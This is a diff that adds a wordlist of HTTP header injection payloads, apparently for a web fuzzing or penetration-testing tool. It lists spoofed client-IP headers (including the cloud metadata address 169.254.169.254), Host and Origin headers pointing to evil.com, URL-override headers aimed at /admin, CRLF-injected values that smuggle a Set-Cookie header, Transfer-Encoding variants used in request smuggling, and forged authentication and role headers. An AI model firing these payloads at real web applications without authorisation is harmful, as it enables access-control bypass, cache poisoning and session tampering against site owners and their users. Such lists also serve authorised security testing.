@@ -1,0 +1,84 @@
+# Header Injection Payloads
+# Format: HEADER_NAME: VALUE
+
+# ==== IP Spoofing / Source Bypass ====
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: localhost
+X-Forwarded-For: 10.0.0.1
+X-Forwarded-For: 192.168.1.1
+X-Forwarded-For: 172.16.0.1
+X-Forwarded-For: 169.254.169.254
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+Forwarded: for=127.0.0.1
+Forwarded: for=127.0.0.1;proto=https
+
+# ==== Host Header Injection ====
+Host: evil.com
+Host: localhost
+Host: 127.0.0.1
+X-Forwarded-Host: evil.com
+X-Host: evil.com
+X-Original-Host: evil.com
+Forwarded: host=evil.com
+
+# ==== URL/Path Override ====
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Custom-IP-Authorization: 127.0.0.1
+X-Original-URL: /api/users
+X-Rewrite-URL: /../admin
+X-Override-URL: /admin
+
+# ==== Cache Poisoning ====
+X-Forwarded-Proto: https
+X-Forwarded-Port: 443
+X-Forwarded-Scheme: https
+X-Frame-Options: SAMEORIGIN
+X-Cache-Status: HIT
+X-Cache-Key: evil
+
+# ==== CORS Bypass ====
+Origin: null
+Origin: https://evil.com
+Origin: http://localhost
+Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: X-Custom-Header
+
+# ==== CRLF Injection ====
+X-Injected: value\r\nSet-Cookie: evil=1
+X-Test: value%0d%0aSet-Cookie:%20evil=1
+X-Header: value%0aX-Injected:%20header
+
+# ==== Content-Type Manipulation ====
+Content-Type: application/json
+Content-Type: application/xml
+Content-Type: text/xml
+Content-Type: application/x-www-form-urlencoded
+Content-Type: multipart/form-data
+
+# ==== Transfer-Encoding Variants ====
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+Transfer-Encoding: gzip, chunked
+Transfer-Encoding:chunked
+Transfer-Encoding : chunked
+
+# ==== Authentication Bypass ====
+X-Auth-Token: admin
+X-API-Key: test
+Authorization: Bearer invalid_token
+X-User-Id: 1
+X-Role: admin
+
+# ==== Debug/Internal Headers ====
+X-Debug: 1
+X-Debug-Token: anything
+X-Requested-With: XMLHttpRequest
+X-Ajax-Request: true
+X-Internal: true
